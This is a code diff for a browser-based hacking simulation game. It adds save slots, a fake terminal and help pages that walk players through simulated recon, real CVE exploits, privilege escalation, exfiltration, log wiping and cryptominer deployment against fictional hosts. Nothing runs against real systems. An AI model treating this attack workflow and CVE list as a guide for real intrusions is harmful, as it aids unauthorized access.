+  COMPANIES.forEach(function(co){(co.contracts||[]).forEach(function(ct){contracts[ct.id]=(co.repReq===0)?'active':'inactive';});});
+  return {handle:handle,hostname:'nb',credits:0,rep:0,wanted:0,tools:['netcat','nmap-adv'],scripts:[],agents:{},pwned:{},miners:{},
+    session:{connected:false,targetId:null,user:null,cwd:'/',isRoot:false},
+    contracts:contracts,discovered:['c0'],reconDone:{},discoveredCves:[],interceptMode:false,
+    created:Date.now(),lastSaved:Date.now()};
+}
+function saveGame(){if(!G)return;G.lastSaved=Date.now();dbPut(G);}
+
+
+// ====== TITLE ======
+function renderTitle(){
+  dbGetAll(function(saves){
+    var el=document.getElementById('char-grid');
+    var html='';
+    saves.forEach(function(s){
+      html+='<div class="char-slot" data-handle="'+s.handle+'">'
+        +'<div class="slot-avatar">&#x1F4BB;</div>'
+        +'<div class="slot-handle">'+s.handle+'</div>'
+        +'<div class="slot-info">&#x20BF;'+s.credits+' &middot; '+s.rep+' REP<br>'+new Date(s.lastSaved).toLocaleDateString()+'</div>'
+        +'<span class="slot-del" data-del="'+s.handle+'">[ DELETE ]</span></div>';
+    });
+    for(var i=saves.length;i<3;i++){
+      html+='<div class="char-slot new-slot"><div class="slot-avatar" style="color:var(--textd)">?</div>'
+        +'<div style="color:var(--textd);font-size:10px">[ EMPTY SLOT ]</div>'
+        +'<div style="font-size:9px;color:var(--textdd);margin-top:5px">tap to create</div></div>';
+    }
+    el.innerHTML=html;
+  });
+}
+function showNewChar(){document.getElementById('new-char-panel').style.display='block';document.getElementById('title-actions').style.display='none';document.getElementById('nc-handle').value='';document.getElementById('nc-handle').focus();}
+function hideNewChar(){document.getElementById('new-char-panel').style.display='none';document.getElementById('title-actions').style.display='block';}
+function createChar(){
+  var raw=document.getElementById('nc-handle').value.trim();
+  var handle=raw.toUpperCase().replace(/[^A-Z0-9_-]/g,'').substring(0,16);
+  if(!handle){toast('Enter a valid callsign','e');return;}
+  dbGetAll(function(saves){
+    if(saves.find(function(s){return s.handle===handle;})){toast('Handle taken','e');return;}
+    if(saves.length>=3){toast('Max 3 operatives','e');return;}
+    G=defaultState(handle);dbPut(G,function(){enterGame();});
+  });
+}
+function selectChar(handle){
+  dbGetAll(function(saves){
+    var s=saves.find(function(x){return x.handle===handle;});
+    if(!s)return;
+    G=JSON.parse(JSON.stringify(s));
+    if(!G.reconDone)G.reconDone={};if(!G.agents)G.agents={};if(!G.miners)G.miners={};
+    if(!G.discoveredCves)G.discoveredCves=[];if(!G.interceptMode)G.interceptMode=false;if(!G.scripts)G.scripts=[];
+    enterGame();
+  });
+}
+function deleteChar(handle){
+  if(!confirm('DELETE OPERATIVE: '+handle+'\n\nThis action is permanent and cannot be undone.\nAll progress, credits, and save data will be lost.\n\nProceed?'))return;
+  dbDelete(handle,function(){renderTitle();toast('Operative '+handle+' deleted.');});
+}
+function enterGame(){
+  document.getElementById('s-title').classList.remove('active');
+  document.getElementById('s-game').classList.add('active');
+  document.getElementById('tb-handle').textContent=G.handle;
+  // Resolve theme: localStorage is authoritative (set by both splash and game toggles)
+  var _isLight=(localStorage.getItem('nb_theme')==='light')||(G.lightTheme===true);
+  G.lightTheme=_isLight;
+  document.body.classList.toggle('light',_isLight);
+  var _tb=document.getElementById('btn-theme');
+  if(_tb)_tb.textContent=_isLight?'☽':'☼';
+  var _ttb=document.getElementById('btn-theme-title');
+  if(_ttb)_ttb.textContent=_isLight?'☽':'☼';
+  renderTopbar();renderWanted();renderFS();renderNetmap();renderCveDb();updatePrompt();
+  switchPane('terminal');
+  tPrint('sys','NETBREAKER OS v5.3 \u2014 Welcome, '+G.handle+'.');
+  tPrint('dim','\u20BF'+G.credits+'  REP: '+G.rep);tPrint('dim','');
+  tPrint('ok','QUICK START: scan \u2192 nmap \u2192 sniffer \u2192 gobuster \u2192 exploit \u2192 privesc \u2192 exfil \u2192 miner');
+  tPrint('hint','help = full command list  |  man <cmd> = detailed help  |  cat walkthrough.txt = guide');
+  tPrint('dim','');
+  document.getElementById('term-input').focus();
+  setupKbOffset();
+}
+function goTitle(){
+  saveGame();G=null;clearTerm();
+  document.getElementById('s-game').classList.remove('active');
+  document.getElementById('s-title').classList.add('active');
+  renderTitle();
+  // Sync title theme button icon with current state
+  var _isLight=document.body.classList.contains('light');
+  var _ttb=document.getElementById('btn-theme-title');
+  if(_ttb)_ttb.textContent=_isLight?'☽':'☼';
+}
+
+
+// ====== EVENTS ======
+document.addEventListener('DOMContentLoaded',function(){
+  document.getElementById('btn-deploy').addEventListener('click',createChar);
+  // Title screen theme toggle
+  var _titleThemeBtn=document.getElementById('btn-theme-title');
+  if(_titleThemeBtn){
+    // Set initial icon
+    _titleThemeBtn.textContent=document.body.classList.contains('light')?'☽':'☼';
+    _titleThemeBtn.addEventListener('click',function(){
+      var light=document.body.classList.toggle('light');
+      this.textContent=light?'☽':'☼';
+      localStorage.setItem('nb_theme',light?'light':'dark');
+      var gameBtn=document.getElementById('btn-theme');
+      if(gameBtn)gameBtn.textContent=light?'☽':'☼';
+    });
+  }
+  document.getElementById('btn-cancel').addEventListener('click',hideNewChar);
+  document.getElementById('btn-new-op').addEventListener('click',showNewChar);
+  document.getElementById('nc-handle').addEventListener('keydown',function(e){if(e.key==='Enter')createChar();});
+  document.getElementById('char-grid').addEventListener('click',function(e){
+    var del=e.target.closest('[data-del]');
+    if(del){e.stopPropagation();deleteChar(del.getAttribute('data-del'));return;}
+    var slot=e.target.closest('.char-slot');
+    if(!slot)return;
+    if(slot.classList.contains('new-slot')){showNewChar();return;}
+    var h=slot.getAttribute('data-handle');if(h)selectChar(h);
+  });
+  document.getElementById('btn-shop').addEventListener('click',openShopModal);
+  document.getElementById('btn-quit').addEventListener('click',goTitle);
+  document.getElementById('btn-theme').addEventListener('click',function(){
+    var light=document.body.classList.toggle('light');
+    this.textContent=light?'☽':'☼';
+    localStorage.setItem('nb_theme',light?'light':'dark');
+    if(G){G.lightTheme=light;saveGame();}
+  });
+  document.getElementById('tabbar').addEventListener('click',function(e){var t=e.target.closest('.tab');if(t)switchPane(t.getAttribute('data-pane'));});
+  document.getElementById('term-input').addEventListener('keydown',termKeyDown);
+  document.getElementById('btn-go').addEventListener('click',browserGo);
+  document.getElementById('browser-url').addEventListener('keydown',function(e){if(e.key==='Enter')browserGo();});
+  document.getElementById('btn-icpt').addEventListener('click',toggleIntercept);
+  document.getElementById('btn-curl').addEventListener('click',openCurlBuilder);
+  document.getElementById('btn-fuzz').addEventListener('click',openFuzzer);
+  document.getElementById('btn-cook').addEventListener('click',openCookies);
+  document.getElementById('btn-diff').addEventListener('click',openDiff);
+  document.getElementById('btn-fwd').addEventListener('click',function(){tPrint('sys','[Intercept] Forwarded.');toast('Forwarded');});
+  document.getElementById('btn-drop').addEventListener('click',function(){tPrint('sys','[Intercept] Dropped.');toast('Dropped','w');});
+  document.getElementById('btn-sendmod').addEventListener('click',sendModified);
+  document.getElementById('modal-bg').addEventListener('click',function(e){if(e.target===this)closeModal();});
+  document.getElementById('modal-x').addEventListener('click',closeModal);
+  document.getElementById('cve-search').addEventListener('input',renderCveDb);
+  document.getElementById('cve-body').addEventListener('click',function(e){var card=e.target.closest('.cve-card');if(card){var d=card.querySelector('.cve-detail');if(d)d.classList.toggle('open');}});
+  document.getElementById('net-svg').addEventListener('click',function(e){
+    var node=e.target.closest('[data-id]');
+    if(!node||node.classList.contains('locked-node'))return;
+    var id=node.getAttribute('data-id');
+    // Zoom to node: find its circle center
+    var circle=node.querySelector('circle');
+    if(circle&&id!=='attacker'){
+      var ncx=parseFloat(circle.getAttribute('cx')),ncy=parseFloat(circle.getAttribute('cy'));
+      var nb=document.getElementById('net-body');
+      var nW=nb?nb.offsetWidth:400,nH=nb?nb.offsetHeight:400;
+      var targetZoom=Math.min(NET_ZOOM_MAX,Math.max(_netZoom,1.8));
+      // _netPanX/Y are the extra offset from center; to put node at center:
+      // tx = canvasCx + panX - canvasCx*zoom = canvasCx*(1-zoom) + panX
+      // We want tx + ncx*zoom = canvasCx => panX = canvasCx*(zoom-1) + canvasCx - ncx*zoom
+      _netPanX=(nW/2-ncx)*targetZoom+(ncx-nW/2);
+      _netPanY=(nH/2-ncy)*targetZoom+(ncy-nH/2);
+      _netZoom=targetZoom;
+      _netFocusId=id;
+      renderNetmap();
+    }
+    showTargetModal(id);
+  });
+  setInterval(function(){if(G)saveGame();},15000);
+  setInterval(function(){
+    if(!G)return;
+    if(G.wanted>0){var r=G.tools.indexOf('tor')>=0?2:G.tools.indexOf('vpn-chain')>=0?0.5:0.1;G.wanted=Math.max(0,G.wanted-r);renderWanted();}
+    if(G.miners&&Object.keys(G.miners).length>0){
+      var income=0;Object.values(G.miners).forEach(function(m){income+=m.rate;});
+      G.credits+=income;renderTopbar();toast('\u26CF +\u20BF'+income);
+    }
+  },30000);
+  initDB(function(){renderTitle();});
+  // Zoom controls
+  document.getElementById('net-zoom-in').addEventListener('click',function(){
+    _netZoom=Math.min(NET_ZOOM_MAX,_netZoom+NET_ZOOM_STEP);
+    if(G)renderNetmap();
+  });
+  document.getElementById('net-zoom-out').addEventListener('click',function(){
+    _netZoom=Math.max(NET_ZOOM_MIN,_netZoom-NET_ZOOM_STEP);
+    if(G)renderNetmap();
+  });
+  document.getElementById('net-zoom-reset').addEventListener('click',function(){
+    _netZoom=1.0;_netPanX=0;_netPanY=0;_netFocusId=null;
+    if(G)renderNetmap();
+  });
+  // SVG drag to pan
+  (function(){
+    var svg=document.getElementById('net-svg');
+    var dragging=false,startX=0,startY=0,startPX=0,startPY=0;
+    svg.addEventListener('mousedown',function(e){
+      if(e.target.closest('[data-id]'))return; // don't pan on node click
+      dragging=true;startX=e.clientX;startY=e.clientY;startPX=_netPanX;startPY=_netPanY;
+      svg.style.cursor='grabbing';
+    });
+    window.addEventListener('mousemove',function(e){
+      if(!dragging)return;
+      _netPanX=startPX+(e.clientX-startX);
+      _netPanY=startPY+(e.clientY-startY);
+      var g=document.getElementById('net-zoom-group');
+      if(g){var nb2=document.getElementById('net-body');var W2=nb2?nb2.offsetWidth:400,H2=nb2?nb2.offsetHeight:400;var cx2=W2/2,cy2=H2/2;var tx2=cx2+_netPanX-cx2*_netZoom;var ty2=cy2+_netPanY-cy2*_netZoom;g.setAttribute('transform','translate('+tx2.toFixed(1)+','+ty2.toFixed(1)+') scale('+_netZoom+')');}
+    });
+    window.addEventListener('mouseup',function(){dragging=false;svg.style.cursor='';});
+    // Scroll wheel zoom
+    svg.addEventListener('wheel',function(e){
+      e.preventDefault();
+      var delta=e.deltaY>0?-NET_ZOOM_STEP:NET_ZOOM_STEP;
+      _netZoom=Math.min(NET_ZOOM_MAX,Math.max(NET_ZOOM_MIN,_netZoom+delta));
+      if(G)renderNetmap();
+    },{passive:false});
+    // Touch pinch zoom
+    var lastDist=0;
+    svg.addEventListener('touchstart',function(e){if(e.touches.length===2){lastDist=Math.hypot(e.touches[0].clientX-e.touches[1].clientX,e.touches[0].clientY-e.touches[1].clientY);}});
+    svg.addEventListener('touchmove',function(e){
+      if(e.touches.length===2){
+        e.preventDefault();
+        var dist=Math.hypot(e.touches[0].clientX-e.touches[1].clientX,e.touches[0].clientY-e.touches[1].clientY);
+        var scale=dist/lastDist;
+        _netZoom=Math.min(NET_ZOOM_MAX,Math.max(NET_ZOOM_MIN,_netZoom*scale));
+        lastDist=dist;
+        var g=document.getElementById('net-zoom-group');
+        if(g){var nb3=document.getElementById('net-body');var W3=nb3?nb3.offsetWidth:400,H3=nb3?nb3.offsetHeight:400;var cx3=W3/2,cy3=H3/2;var tx3=cx3+_netPanX-cx3*_netZoom;var ty3=cy3+_netPanY-cy3*_netZoom;g.setAttribute('transform','translate('+tx3.toFixed(1)+','+ty3.toFixed(1)+') scale('+_netZoom+')');}
+      }
+    },{passive:false});
+  })();
+  // ResizeObserver: re-render map when pane size changes
+  if(window.ResizeObserver){
+    var _ro=new ResizeObserver(function(){if(G&&document.getElementById('pane-network').classList.contains('on'))renderNetmap();});
+    var nb=document.getElementById('net-body');
+    if(nb)_ro.observe(nb);
+  }
+});
+
+
+// ====== KB OFFSET ======
+function setupKbOffset(){
+  var inp=document.getElementById('term-input'),game=document.getElementById('s-game');
+  function apply(){if(document.activeElement===inp&&window.visualViewport){var off=window.innerHeight-window.visualViewport.height;game.style.paddingBottom=off>50?off+'px':'0';var out=document.getElementById('term-output');out.scrollTop=out.scrollHeight;}}
+  inp.addEventListener('focus',function(){setTimeout(apply,300);});
+  inp.addEventListener('blur',function(){game.style.paddingBottom='0';});
+  if(window.visualViewport)window.visualViewport.addEventListener('resize',apply);
+  window.addEventListener('resize',function(){if(G&&document.getElementById('pane-network').classList.contains('on'))setTimeout(renderNetmap,50);});
+}
+
+
+// ====== TERMINAL ======
+var tHist=[],tIdx=-1;
+function tPrint(cls,text){var el=document.getElementById('term-output');var d=document.createElement('span');d.className='tl '+(cls||'');d.textContent=(text===''||text==null)?'\u00A0':String(text);el.appendChild(d);el.scrollTop=el.scrollHeight;}
+function clearTerm(){var el=document.getElementById('term-output');if(el)el.innerHTML='';}
+function termFocus(){document.getElementById('term-input').focus();}
+function termKeyDown(e){
+  var inp=e.target;
+  if(e.key==='Enter'){
+    var cmd=inp.value.trim();if(!cmd)return;
+    var s=G.session,co=s.connected?COMPANIES.find(function(c){return c.id===s.targetId;}):null;
+    tPrint('cmd',(s.connected?s.user+'@'+(co?co.domain:'?')+':'+s.cwd+'$':G.handle+'@nb:~$')+' '+cmd);
+    tHist.unshift(cmd);tIdx=-1;inp.value='';runCommand(cmd);
+  } else if(e.key==='ArrowUp'){e.preventDefault();if(tIdx<tHist.length-1){tIdx++;inp.value=tHist[tIdx]||'';}}
+  else if(e.key==='ArrowDown'){e.preventDefault();if(tIdx>0){tIdx--;inp.value=tHist[tIdx]||'';}else{tIdx=-1;inp.value='';}}
+  else if(e.key==='Tab'){
+    e.preventDefault();
+    var all=['help','man','clear','whoami','pwd','ping','scan','nmap','gobuster','deploy','agents',
+             'exploit','brute','ssh','ftp','nc','ls','cd','cat','privesc','persist','exfil',
+             'curl','contracts','shop','editor','run','disconnect','cve','pivot',
+             'clearlogs','rotateip','miners','exit','q','hostname',
+             'grep','find','id','uname','ps','history','echo','ifconfig','ip','env',
+             'sudo','su','chmod','touch','mkdir','which'];
+    var p=inp.value.toLowerCase();var m=all.find(function(c){return c.startsWith(p)&&c!==p;});
+    if(m)inp.value=m;
+  }
+}
+function updatePrompt(){
+  var s=G?G.session:null,co=s&&s.connected?COMPANIES.find(function(c){return c.id===s.targetId;}):null;
+  var _hn=G&&G.hostname?G.hostname:'nb';document.getElementById('term-prompt').textContent=s&&s.connected?s.user+'@'+(co?co.domain:'?')+':'+s.cwd+'$ ':(G?G.handle:'guest')+'@'+_hn+':~$ ';
+}
+function termExec(cmd){tPrint('cmd','> '+cmd);runCommand(cmd);}
+
+
+// ====== COMMANDS ======
+function runCommand(raw){
+  if(raw.includes('|')){
+    raw.split('|').map(function(s){return s.trim();}).filter(Boolean).forEach(function(cmd){runCommand(cmd);});
+    return;
+  }
+  var parts=raw.trim().split(/\s+/),cmd=parts[0].toLowerCase(),args=parts.slice(1);
+  var s=G.session,tgt=s.connected?COMPANIES.find(function(c){return c.id===s.targetId;}):null;
+  var map={
+    help:cmdHelp, man:function(){cmdMan(args[0]);}, clear:clearTerm,
+    pwd:function(){tPrint('',s.cwd||'~');}, whoami:cmdWhoami,
+    ping:function(){cmdPing(args);}, scan:function(){cmdScan(args);},
+    nmap:function(){cmdNmap(args);}, gobuster:function(){cmdGobuster(args);},
+    deploy:function(){cmdDeploy(args);}, agents:cmdAgents,
+    ssh:function(){cmdSsh(args);}, ftp:function(){cmdFtp(args);},
+    nc:function(){cmdNc(args);}, exploit:function(){cmdExploit(args);},
+    brute:function(){cmdBrute(args);},
+    ls:function(){cmdLs(args,s,tgt);}, cd:function(){cmdCd(args,s,tgt);},
+    cat:function(){cmdCat(args,s,tgt);}, privesc:function(){cmdPrivesc(args,s,tgt);},
+    persist:function(){cmdPersist(args,s,tgt);}, exfil:function(){cmdExfil(args,s,tgt);},
+    curl:function(){cmdCurl(args);}, contracts:cmdContracts,
+    shop:openShopModal, editor:openEditorModal, run:function(){cmdRun(args);},
+    disconnect:cmdDisc, exit:cmdDisc, q:cmdDisc,
+    cve:function(){cmdCve(args);}, pivot:function(){cmdPivot(args,s,tgt);},
+    clearlogs:function(){cmdClearLogs(args,s,tgt);},
+    rotateip:cmdRotateIp, miners:cmdMiners,
+    hostname:function(){cmdHostname(args);},
+    grep:function(){cmdGrep(args,s,tgt);},
+    find:function(){cmdFind(args,s,tgt);},
+    id:cmdWhoami,
+    uname:function(){cmdUname(args,s,tgt);},
+    ps:function(){cmdPs(s,tgt);},
+    history:function(){tPrint('pre',tHist.slice(0,20).map(function(h,i){return '  '+(i+1)+'  '+h;}).join('\n'));},
+    echo:function(){tPrint('',args.join(' '));},
+    ifconfig:function(){cmdIfconfig(s,tgt);},
+    ip:function(){cmdIp(args,s,tgt);},
+    env:function(){cmdEnv(s,tgt);},
+    sudo:function(){cmdSudo(args,s,tgt);},
+    su:function(){cmdSu(args,s,tgt);},
+    chmod:function(){tPrint('dim','chmod: operation simulated');},
+    touch:function(){tPrint('dim','touch: '+args[0]+': file created (simulated)');},
+    mkdir:function(){tPrint('dim','mkdir: '+args[0]+': directory created (simulated)');},
+    which:function(){cmdWhich(args);},
+    id:function(){cmdId(s,tgt);}
+  };
+  if(map[cmd])map[cmd]();
+  else{tPrint('err','-bash: '+cmd+': command not found');tPrint('dim','Type "help" for commands. Tab to autocomplete.');}
+}
+
+
+function cmdHelp(){
+  tPrint('ok','QUICK START: scan \u2192 nmap \u2192 deploy sniffer \u2192 gobuster \u2192 exploit \u2192 privesc \u2192 exfil \u2192 deploy miner');
+  tPrint('hint','man <cmd> = detailed help  |  cat walkthrough.txt = full guide');
+  tPrint('','');
+  tPrint('hdr','RECON');
+  tPrint('dim','  scan <subnet>        Discover hosts  e.g. scan 192.168.10.0/24  (+10c/host)');
+  tPrint('dim','  nmap [-sV -sC] <ip>  Port/service/CVE scan  (+15c/vuln found)');
+  tPrint('dim','  gobuster <ip>        Web directory brute-force  (+20c)');
+  tPrint('dim','  deploy sniffer <ip>  Passive credential capture -- SILENT  (+30c)');
+  tPrint('dim','  deploy crawler <ip>  Web content mapping');
+  tPrint('dim','  agents               View deployed agent results');
+  tPrint('dim','  ping <ip>            Test host reachability');
+  tPrint('','');
+  tPrint('hdr','EXPLOITATION');
+  tPrint('dim','  exploit <vuln> <ip>  Run exploit module  (+75c shell / +150c root)');
+  tPrint('dim','  brute <svc> <ip>     Credential brute force (NOISY -- prefer sniffer)');
+  tPrint('dim','  nc <ip> <port>       Netcat connection');
+  tPrint('dim','  curl <url>           Manual HTTP request');
+  tPrint('','');
+  tPrint('hdr','ACCESS');
+  tPrint('dim','  ssh [user@]<ip>      SSH login  (+50c)');
+  tPrint('dim','  ftp <ip>             FTP connection (fingerprints version)');
+  tPrint('dim','  disconnect / exit / q  Close current session');
+  tPrint('','');
+  tPrint('hdr','FILESYSTEM  (on connected target)');
+  tPrint('dim','  ls [path]   cd <path>   cat <file>   pwd');
+  tPrint('','');
+  tPrint('hdr','POST-EXPLOITATION');
+  tPrint('dim','  privesc [method]     Escalate privileges  (linpeas/sudo/suid/cron/token)');
+  tPrint('dim','  persist <method>     Install persistence  (cron/backdoor/service)');
+  tPrint('dim','  exfil <path> [how]   Exfiltrate file      (http/https/dns)');
+  tPrint('dim','  pivot <src> <dst>    Pivot through compromised host');
+  tPrint('','');
+  tPrint('hdr','OPSEC');
+  tPrint('dim','  clearlogs [ip]       Wipe logs locally (-1 wanted) or remote (-2 wanted)');
+  tPrint('dim','  rotateip             Rotate attacker IP, break traces  (-2 wanted)');
+  tPrint('','');
+  tPrint('hdr','MINING');
+  tPrint('dim','  deploy miner <ip>    Deploy XMR miner on rooted host  (passive income)');
+  tPrint('dim','  miners               List active miners and total income rate');
+  tPrint('','');
+  tPrint('hdr','VIRTUAL FILES');
+  tPrint('dim','  cat walkthrough.txt          Main guide + topic index');
+  tPrint('dim','  cat walkthrough-targets.txt  All 7 target walkthroughs');
+  tPrint('dim','  cat walkthrough-web.txt      Web exploit techniques');
+  tPrint('dim','  cat walkthrough-opsec.txt    Wanted/evasion guide');
+  tPrint('dim','  cat walkthrough-mining.txt   Mining and economy guide');
+  tPrint('dim','  cat exploits.txt             Quick exploit reference');
+  tPrint('dim','  cat tools.txt                Installed tools and commands');
+  tPrint('','');
+  tPrint('hdr','OTHER');
+  tPrint('dim','  contracts   shop   editor   cve <term>   whoami   man <cmd>   clear');
+}
+
+
+var MAN_PAGES={
+  scan:'NAME: scan\nSYNOPSIS: scan <subnet>\nEXAMPLE: scan 192.168.10.0/24\nEFFECT: Discovers live hosts. +10c per host. Marks reconDone.ping.\nNEXT: nmap -sV -sC <ip>',
+  nmap:'NAME: nmap\nSYNOPSIS: nmap [flags] <ip>\nFLAGS: -sV (versions) -sC (scripts) -O (OS detect) -p- (all ports) -A (aggressive)\nEFFECT: Reveals CVEs. +15c per vuln. Adds CVEs to CVE-DB tab.\nEXAMPLE: nmap -sV -sC 192.168.10.14',
+  gobuster:'NAME: gobuster\nSYNOPSIS: gobuster <ip>\nREQUIRES: gobuster from shop (100c)\nEFFECT: Finds hidden web paths. +20c. Required for hard targets.\nEXAMPLE: gobuster 192.168.10.14',
+  deploy:'NAME: deploy\nSYNOPSIS: deploy <type> <ip>\nTYPES:\n  sniffer  -- Passive cred capture. SILENT. Does not trigger IDS. +30c.\n  crawler  -- Maps web content.\n  miner    -- Deploy XMR miner on rooted host for passive income.\nEXAMPLES:\n  deploy sniffer 192.168.10.14\n  deploy miner 192.168.10.14   (requires root + miner tool)',
+  agents:'NAME: agents\nEFFECT: Shows results from all deployed sniffers and crawlers.',
+  ping:'NAME: ping\nSYNOPSIS: ping <ip>\nEFFECT: Test if host is reachable.',
+  ssh:'NAME: ssh\nSYNOPSIS: ssh [user@]<ip>\nEFFECT: Open SSH shell. +50c on success.\nREQUIRES: Valid credentials (use sniffer or brute first)\nEXAMPLE: ssh marcus.reed@192.168.10.14',
+  ftp:'NAME: ftp\nSYNOPSIS: ftp <ip>\nEFFECT: Connect to FTP. Fingerprints version. Detects vsftpd backdoor.\nNEXT: exploit vsftpd-backdoor <ip>',
+  nc:'NAME: nc (netcat)\nSYNOPSIS: nc <ip> <port>  /  nc -lvnp <port>\nUSE: Connect to bind shells after backdoor exploit.\nEXAMPLE: nc 192.168.10.14 6200',
+  exploit:'NAME: exploit\nSYNOPSIS: exploit <vuln> <ip>\nEXAMPLES:\n  exploit CVE-2017-7679 192.168.10.14\n  exploit vsftpd-backdoor 192.168.10.14\n  exploit CVE-2020-1938 10.0.5.22\n  exploit CVE-2022-1388 172.16.5.100\n  exploit S7-auth-bypass 10.10.1.5\n  exploit sqli / xss / lfi / csrf / idor  <ip>\nREQUIRES: metasploit for CVE exploits. Check CVE-DB tab.',
+  brute:'NAME: brute\nSYNOPSIS: brute <service> <ip>\nSERVICES: ssh ftp mysql http-form\nREQUIRES: hydra\nWARNING: NOISY. Triggers IDS. Use deploy sniffer instead.',
+  curl:'NAME: curl\nSYNOPSIS: curl <url> [-X method] [-d data] [-H header]\nEXAMPLE: curl http://petroflow.local/login.php\nTIP: Use INTERCEPT in browser pane for GUI request editing.',
+  ls:'NAME: ls\nSYNOPSIS: ls [path]\nREQUIRES: Active session on target.',
+  cd:'NAME: cd\nSYNOPSIS: cd <path>\nEXAMPLE: cd /var/www/html\nNOTE: cd /root requires root access.',
+  cat:'NAME: cat\nSYNOPSIS: cat <file>\nNOTE: /root/* files require root. Shadow requires root.\nVIRTUAL FILES: walkthrough.txt, tools.txt, exploits.txt and all walkthrough-*.txt',
+  privesc:'NAME: privesc\nSYNOPSIS: privesc [method]\nMETHODS: linpeas sudo suid cron token mimikatz hmi-admin\nTIP: Always run privesc linpeas first -- it finds the path.\n+100c for escalation, +150c for root shell.',
+  persist:'NAME: persist\nSYNOPSIS: persist <method>\nMETHODS: cron backdoor service\nREQUIRES: Root access.',
+  exfil:'NAME: exfil\nSYNOPSIS: exfil <path> [http|https|dns]\n  http   noisy, triggers IDS\n  https  encrypted, recommended\n  dns    covert, evades DLP (needs exfil-kit)\nEXAMPLE: exfil /root/flag.txt https',
+  pivot:'NAME: pivot\nSYNOPSIS: pivot <src-ip> <dst-ip>\nREQUIRES: Root on src + metasploit-pro',
+  clearlogs:'NAME: clearlogs\nSYNOPSIS: clearlogs [ip]\n  No arg: wipes local traces, -1 wanted\n  With IP: wipes remote logs, -2 wanted\nREQUIRES: log-cleaner tool for remote wipe',
+  rotateip:'NAME: rotateip\nEFFECT: Rotates attacker IP via proxy chain. Breaks active traces. -2 wanted.\nREQUIRES: ip-rotator tool',
+  miners:'NAME: miners\nEFFECT: Lists all active XMR miners, rates, total income.\nSEE ALSO: deploy miner <ip>  cat walkthrough-mining.txt',
+  cve:'NAME: cve\nSYNOPSIS: cve <search-term>\nEFFECT: Search CVE database from terminal. Opens CVE-DB tab.\nEXAMPLE: cve apache  /  cve critical  /  cve discovered',
+  whoami:'NAME: whoami\nEFFECT: Show current user, host, CWD, root status, credits.',
+  contracts:'NAME: contracts\nEFFECT: List all active and completed contracts with rewards.',
+  shop:'NAME: shop\nEFFECT: Open darknet shop modal. Buy tools with credits.',
+  editor:'NAME: editor\nEFFECT: Open script editor. Save and run custom bash scripts.',
+  run:'NAME: run\nSYNOPSIS: run <script-name>\nEFFECT: Execute a saved script.',
+  disconnect:'NAME: disconnect / exit / q\nEFFECT: Close current target session. Return to local machine.'
+};
+function cmdMan(topic){
+  if(!topic){
+    tPrint('dim','Usage: man <cmd>');
+    tPrint('dim','Available topics:');
+    var topics=Object.keys(MAN_PAGES);
+    for(var i=0;i<topics.length;i+=5){tPrint('dim','  '+topics.slice(i,i+5).join('  '));}
+    return;
+  }
+  var m=MAN_PAGES[topic.toLowerCase()];
+  if(!m){tPrint('err','No manual entry for: '+topic);tPrint('dim','Try: man  (no args) for topic list');return;}
+  tPrint('hdr','MAN: '+topic.toUpperCase());
+  m.split('\n').forEach(function(l){tPrint('pre',l);});
+}
+
+
+// ====== WHOAMI / PING ======
+function cmdWhoami(){
+  var s=G.session,co=s.connected?COMPANIES.find(function(c){return c.id===s.targetId;}):null;
+  if(s.connected&&co){
+    tPrint('','uid='+(s.isRoot?'0(root)':'1001('+s.user+')'));
+    tPrint('dim','Host: '+co.domain+' ('+co.ip+')  CWD: '+s.cwd);
+    tPrint('dim','Root: '+(s.isRoot?'YES':'NO -- run privesc'));
+  } else {
+    tPrint('',G.handle+'@netbreaker');
+    tPrint('dim','\u20BF'+G.credits+'  REP: '+G.rep+'  Heat: '+G.wanted.toFixed(1)+'/5');
+    tPrint('dim','Tools: '+G.tools.join(', '));
+    if(G.miners&&Object.keys(G.miners).length>0){
+      var rate=Object.values(G.miners).reduce(function(a,m){return a+m.rate;},0);
+      tPrint('dim','Mining: '+Object.keys(G.miners).length+' rigs @ \u20BF'+rate+'/30s');
+    }
+  }
+}
+var _pingLog={};
+function cmdPing(args){
+  var ip=args[0];if(!ip){tPrint('err','Usage: ping <ip>');return;}
+  var co=COMPANIES.find(function(c){return c.ip===ip;});
+  var s=G.session,src=s.connected?(s.targetId||'local'):'local';
+  var pairKey=src+'->'+ip;
+  var latency=s.connected?(Math.random()*3+0.1).toFixed(1):(Math.random()*30+8).toFixed(1);
+  after(400,function(){
+    if(co&&G.discovered.indexOf(co.id)>=0){
+      tPrint('ok','PING '+ip+': 64 bytes icmp_seq=1 ttl=64 time='+latency+'ms');
+      if(!_pingLog[pairKey]){
+        _pingLog[pairKey]=true;
+        G.credits+=5;tPrint('ok','[+] +\u20BF5 (new host reachability confirmed)');renderTopbar();
+      }
+    } else tPrint('err','PING '+ip+': Request timeout.');
+  });
+}
+
+// ====== SCAN ======
+function cmdScan(args){
+  var subnet=args[0];if(!subnet){tPrint('err','Usage: scan <subnet>  e.g. scan 192.168.10.0/24');return;}
+  tPrint('sys','[*] Ping sweep: '+subnet+'...');
+  after(1400,function(){
+    var base=subnet.split('.').slice(0,3).join('.');
+    var hits=G.discovered.map(function(id){return COMPANIES.find(function(c){return c.id===id;});})
+      .filter(function(co){return co&&co.ip.startsWith(base);});
+    if(!hits.length){
+      tPrint('dim','[*] No hosts on '+subnet);
+      tPrint('dim','    Known subnets: 192.168.10.0/24  10.0.5.0/24  10.20.5.0/24');
+      tPrint('dim','                   172.16.5.0/24  185.14.6.0/24  10.10.1.0/24  172.31.10.0/24');
+      return;
+    }
+    tPrint('ok','[+] '+hits.length+' host(s) up:');
+    var bonus=0;
+    hits.forEach(function(co){
+      tPrint('ok','    '+co.ip.padEnd(16,' ')+' '+co.domain);
+      if(!G.reconDone[co.id])G.reconDone[co.id]={};
+      if(!G.reconDone[co.id].ping){
+        G.reconDone[co.id].ping=true;
+        bonus+=10;
+      }
+    });
+    if(bonus>0){G.credits+=bonus;tPrint('ok','[+] Recon bonus: +\u20BF'+bonus+' (one-time per host)');}
+    else tPrint('dim','[*] Hosts already scanned -- no bonus.')
+    renderTopbar();checkUnlock();renderNetmap();saveGame();
+    tPrint('dim','[*] Next: nmap -sV -sC <ip> on each discovered host');
+  });
+}
+
+// ====== NMAP ======
+function cmdNmap(args){
+  var flags=args.filter(function(a){return a.startsWith('-');});
+  var ip=args.find(function(a){return !a.startsWith('-');});
+  if(!ip){tPrint('err','Usage: nmap [-sV -sC -O] <ip>  |  man nmap');return;}
+  var co=COMPANIES.find(function(c){return c.ip===ip;});
+  if(!co||G.discovered.indexOf(co.id)<0){tPrint('err','Host not discovered. Run scan first.');return;}
